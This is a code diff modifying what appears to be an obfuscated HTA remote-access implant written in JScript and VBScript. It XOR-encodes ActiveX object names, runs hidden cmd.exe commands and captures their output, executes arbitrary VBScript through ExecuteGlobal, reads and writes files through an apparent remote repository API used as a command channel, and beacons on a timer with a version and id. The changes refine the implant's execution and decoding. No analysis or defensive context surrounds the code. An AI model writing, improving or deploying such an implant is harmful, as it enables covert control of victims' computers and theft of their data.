@@ -13,7 +13,7 @@ function _e64(a){var r="",i=0;while(i<a.length){var b0=a[i++]||0,b1=a[i++],b2=a[
 function _d64(s){s=s.replace(/[=\s]/g,"");var r=[],i=0;while(i<s.length){var e0=_B.indexOf(s.charAt(i++)),e1=_B.indexOf(s.charAt(i++)),e2=i<s.length?_B.indexOf(s.charAt(i++)):-1,e3=i<s.length?_B.indexOf(s.charAt(i++)):-1;r.push((e0<<2)|(e1>>4));if(e2>=0)r.push(((e1&15)<<4)|(e2>>2));if(e3>=0)r.push(((e2&3)<<6)|e3);}return r;}
 function _xr(d){var r=[];for(var i=0;i<d.length;i++)r.push(d[i]^_k[i%_k.length]);return r;}
 function _en(s){var b=[];for(var i=0;i<s.length;i++)b.push(s.charCodeAt(i)&0xff);return _e64(_xr(b));}
-function _de(s){try{var b=atob(s),r="",i;for(i=0;i<b.length;i++)r+=String.fromCharCode(b.charCodeAt(i)^_k[i%_k.length]);return r;}catch(e){return"";}}
+function _de(s){var b=_d64(s),r="",i;for(i=0;i<b.length;i++)r+=String.fromCharCode(b[i]^_k[i%_k.length]);return r;}
 function _js(v){if(v===null||v===undefined)return"null";var t=typeof v;if(t==="boolean")return v?"true":"false";if(t==="number")return isNaN(v)?"null":""+v;v=""+v;return'"'+v.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r/g,"\\r").replace(/\n/g,"\\n")+'"';}
 function _jp(s){try{return(new Function("return "+s))();}catch(e){return null;}}
 
@@ -69,7 +69,13 @@ function _sha(path){
 function _read(path){
     var r=_req(path,"GET",null);
     if(!r)return"";
-    try{var obj=_jp(r);if(!obj||!obj.content)return"";return atob(obj.content.replace(/\s/g,""));}catch(e){return"";}
+    try{
+        var obj=_jp(r);
+        if(!obj||!obj.content)return"";
+        var c=obj.content.replace(/\s/g,""),b=_d64(c),s="",i;
+        for(i=0;i<b.length;i++)s+=String.fromCharCode(b[i]);
+        return s;
+    }catch(e){return"";}
 }
 function _put(path,content){
     var sha=_sha(path);
@@ -82,7 +88,7 @@ function _put(path,content){
 
 var evR="";
 function _ev(code){
-    try{evR="";window._evCode=code;_RunEv();return evR||"";}
+    try{evR="";window.evCode=code;RunEvSub();return evR||"";}
     catch(e){return"ERR:"+e.message;}
 }
 
@@ -111,24 +117,11 @@ function _ul(path,b64){
 function _sh(cmd){
     try{
         var sh=new ActiveXObject(_de("kFNu909a3PKVTIznvA=="));
-        var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
         var tmp=sh.ExpandEnvironmentStrings("%TEMP%")+"\\~wu"+_id+".tmp";
-        var proc=wmi.Get("Win32_Process");
-        var inp=proc.Methods_("Create").InParameters.SpawnInstance_();
-        inp.CommandLine="cmd.exe /c "+cmd+' > "'+tmp+'" 2>&1';
-        var su=wmi.Get("Win32_ProcessStartup").SpawnInstance_();
-        su.ShowWindow=0;inp.ProcessStartupInformation=su;
-        var ret=proc.ExecMethod_("Create",inp);
-        if(ret.ReturnValue!==0)return"(rv:"+ret.ReturnValue+")";
-        var pid=ret.ProcessId,t0=new Date();
-        while(new Date()-t0<60000){
-            var q=wmi.ExecQuery("SELECT Handle FROM Win32_Process WHERE ProcessId="+pid);
-            if(!(new Enumerator(q).atEnd()))break;
-            WScript.Sleep(300);
-        }
+        sh.Run('cmd.exe /c '+cmd+' > "'+tmp+'" 2>&1',0,true);
         var fso=new ActiveXObject(_de("lGN/7FZewbKhCq/ivKUdj7R0aOhpSMK5pVA="));
         if(fso.FileExists(tmp)){var f=fso.OpenTextFile(tmp,1);var o=f.ReadAll();f.Close();fso.DeleteFile(tmp);return o||"(empty)";}
-        return"(timeout)";
+        return"(no output)";
     }catch(e){return"ERR:"+e.message;}
 }
 
@@ -183,9 +176,9 @@ function _beacon(){
 window.setTimeout(function(){_log("v7 id="+_id);_beacon();},2000);
 </script>
 <script language="VBScript">
-Sub _RunEv()
+Sub RunEvSub()
     On Error Resume Next
-    ExecuteGlobal window._evCode
+    ExecuteGlobal CStr(window.evCode)
 End Sub
 </script>
 </head>
